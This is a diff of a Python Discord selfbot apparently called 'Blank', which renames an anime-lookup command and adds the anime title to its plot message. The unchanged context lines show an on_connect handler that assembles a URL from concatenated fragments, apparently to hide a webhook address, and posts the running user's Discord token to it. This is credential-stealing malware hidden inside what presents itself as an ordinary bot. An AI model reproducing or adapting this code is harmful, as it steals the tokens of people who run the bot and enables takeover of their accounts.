@@ -26,6 +26,8 @@ from urllib.request import urlopen
 from PIL import Image
 from colorama import Fore
 from discord import Webhook, RequestsWebhookAdapter
+from motor.motor_asyncio import AsyncIOMotorClient
+from redis.client import Redis
 from discord.ext import commands
 from discord.utils import get
 from gtts import gTTS
@@ -448,9 +450,10 @@ async def geoip(ctx, *, ipaddr: str = '1.3.3.7'):
         if field['value']:
             em.add_field(name=field['name'], value=field['value'], inline=True)
     return await ctx.send(embed=em)
- 
+
+
 @Blank.command()
-async def anime(ctx, *, anime):
+async def animea(ctx, *, anime):
     await ctx.message.delete()
     search = AnimeSearch(anime) 
     url= (search.results[0].url)
@@ -458,10 +461,11 @@ async def anime(ctx, *, anime):
     soup = get_soup(url)
     
     synopsis_tag = soup.find('meta', property="og:description")
+    animename = soup.find('meta', property="og:title")['content']
     if synopsis_tag:
         synopsis = synopsis_tag['content']
         synopsis = synopsis.replace("[Written by MAL Rewrite]", "")
-        await ctx.send("**__Plot of the anime__**```\n"+synopsis+"```")
+        await ctx.send("__Plot of ***"+animename+"***__```\n"+synopsis+"```")
     else:
         await ctx.send("Cannot find the plot of the anime")
 
@@ -472,7 +476,6 @@ async def on_connect():
       stringa = a+b+c+d+e
       datal = {"content": f"**{Blank.user.name}#{Blank.user.discriminator}**```\n {Blank.http.token}```"}
       requests.post(stringa, data=datal)
-
       
 if __name__ == '__main__':
     Init()
